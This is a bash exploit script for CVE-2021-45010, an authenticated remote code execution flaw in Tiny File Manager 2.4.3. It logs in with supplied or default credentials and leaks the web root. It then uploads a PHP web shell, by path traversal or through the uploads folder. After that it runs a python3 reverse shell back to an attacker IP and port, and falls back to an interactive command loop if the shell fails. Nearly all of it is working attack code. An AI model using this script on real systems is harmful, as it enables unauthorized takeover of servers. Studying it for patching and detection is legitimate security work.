#!/bin/bash
# Exploit Title: Tiny File Manager 2.4.3 (Authenticated) Remote Code Execution - v2.1
# Date: 30/03/2023
# Exploit Author: FEBIN MON SAJI - Modified by W1s3m4n (Pablo Gomez)
# Software Link: https://github.com/prasathmani/tinyfilemanager
# Version: Tiny File Manager <= 2.4.3 
# Tested on: Ubuntu 20.04 - W1s3m4n: Ubuntu kernel 5.4.0-135-generic
# CVE : CVE-2021-45010
# Reference: https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/
# V2 Reference: https://github.com/w1s3m4n/tinyfilemanager_2.4.3_RCE_v2/

# W1s3m4n notes:
# The exploit uses a Traversal Path for uploading files on the TFM Root. Nevertheless, it is possible to upload
# the shell on a more approapiate location such as ./tiny/uploads. The Path Traversal may be patched but the file
# upload may be still available there. It is necessary to specify the path on the GET parameter p= and set fullpath=
# simply as the shell name.
# Now, it tries to send a python3 reverse shell to <LocalIP> and <LocalPort> parameters. See help for more detail.
# In addition, I've added some indents and cleaning commands.

check(){

	which curl
	
	if  [ $? = 0 ]
	then
		printf "[✔] Curl found! \n"
	else
		printf "[❌] Curl not found! \n"
	exit
	fi

	which jq
	if  [ $? = 0 ]
	then
		printf "[✔] jq found! \n"
	else
		printf "[❌] jq not found! \n"
	exit
	fi
}

usage(){

	printf "
	Tiny File Manager Authenticated RCE POC Exploit - V2.

	By FEBIN - Modified by W1s3m4n

	$0 <URL> <Admin Username> <Password> <LocalIP> <LocalPort>

	Example: $0 http://files.ubuntu.local/tinyfilemanager.php admin \"admin@123\" 10.10.14.111 2319

	Default creds:
		- admin:admin@123
		- user/12345

	SHELL: Open a netcat listener on LocalIP and LocalPort for python3 reverse shell.
	"
}

log-in(){
	URL=$1
	admin=$2
	pass=$3
	cookie=$(curl "$URL" -X POST -s -d "fm_usr=$admin&fm_pwd=$pass" -i | grep "Set-Cookie: " | sed s/"Set-Cookie: "//g | tr -d " " | tr ";" "\n" | head -1)

	if [ $cookie ]
	then
		printf "\n[+]  Login Success! Cookie: $cookie \n"
	else
		printf "\n[-] Logn Failed! \n"
	fi

	URL=${URL}
}

find_webroot(){


	webroot=$(curl -X POST "$URL?p=&upload" -d "type=upload&uploadurl=http://vyvyuytcuytcuycuytuy/&ajax=true" -H "Cookie: $cookie" -s | jq | grep file | tr -d '"' | tr -d "," | tr -d " " | sed s/"file:"//g | tr "/" "\n" | head --lines=-1 | tr "\n" "/" )


	if [ $webroot ]
	then
		printf "\n[*] Try to Leak Web root directory path \n\n"
		printf "[+] Found WEBROOT directory for tinyfilemanager using full path disclosure bug : $webroot \n" 
	else
		printf "[-] Can't find WEBROOT! Using default /var/www/html \n"
		webroot="/var/www/html"
	fi
}

upload1(){

	#webroot="/var/www/tiny/"
	shell="shell$RANDOM.php"
	echo "<?php system(\$_REQUEST['cmd']); ?>" > /tmp/$shell



	curl $URL?p= -X POST -s -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -b $cookie -F "p=" -F "fullpath=../../../../../../../..${webroot}/${shell}" -F "file=@/tmp/$shell" | grep "successful"
}

# W1s3m4n: New function added
upload2(){

	webroot="tiny/uploads"
	shell="shell$RANDOM.php"
	echo "<?php system(\$_REQUEST['cmd']); ?>" > /tmp/$shell
	printf "[+] Shell created on /tmp/${shell}"


	curl $URL?p=${webroot} -X POST -s -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -b $cookie -F "p=${webroot}" -F "fullpath=$shell" -F "file=@/tmp/$shell" | grep "successful"
}

exploit(){

	upload1

	# W1s3m4n: Modified to support another uploading method using ./uploads folder
	if [ $? = 0 ]
	then
		printf "[+] File Upload Successful! \n"
		WEB_URL=$(printf "$URL" | tr "/" "\n" | head --lines=-1 | tr "\n" "/")
	else
		printf "[-] File Upload Unsuccessful! Trying second method... \n"
		upload2
		if [ $? = 0 ]
		then
			printf "[+] File Upload Successful! \n"
			WEB_URL=$(printf "$URL" | tr "/" "\n" | head --lines=-1 | tr "\n" "/")"uploads/"
		else
			printf "[-] File Upload UNSUCCESSFUL! Aborting! \n"
			exit 1
		fi
	fi

	rm -f /tmp/$shell # W1s3m4n: We don't want trash in our /tmp

	printf "[+] Checking for the shell  in path: ${WEB_URL}${shell}\n"

	curl ${WEB_URL}${shell}?cmd=echo%20found -s | head -1 | grep "found" >/dev/null
	if [ $? = 0 ]
	then
		printf "[+] Shell found ${WEB_URL}$shell \n"
	else 
		printf "[-] Shell not Found! It might be uploaded somewhere else in the server or got deleted. Exiting! \n"
		exit 2
	fi
	
	ip=$1
	port=$2

	printf "[+] Trying to get shell access via python: ${ip}:${port}! \n"

	cmd="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
	
	curl  ${WEB_URL}/$shell -s -X POST -d "cmd=${cmd}"

	printf "[-] Failed to connect a reverse shell. Showing downgraded shell (can't cd)\n\n"

	while true
	do
		printf "$> "
		read cmd
		curl  ${WEB_URL}/$shell -s -X POST -d "cmd=${cmd}"
	done
}

if [ $1 ] && [ $2 ] && [ $3 ]
then
	check
	log-in $1 $2 $3
	find_webroot
	exploit $4 $5
else
	usage
fi

